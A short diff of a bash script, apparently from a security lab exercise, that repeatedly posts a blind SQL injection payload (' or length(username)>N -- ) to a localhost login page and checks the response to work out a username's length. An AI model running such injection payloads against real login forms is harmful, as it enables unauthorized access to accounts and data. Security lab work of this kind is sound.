@@ -3,7 +3,7 @@
 username_len = 0
 for (( ; ;))
 do
-	curl -s --data "u=\" or length(username)>\"$username_len\" -- " http://localhost/lab09/login.php > result.html
+	curl -s --data "u=\" or length(username)>$username_len -- " http://localhost/lab09/login.php > result.html
 
 	file=$(<result.html)
 	substring="magicworld.gif"
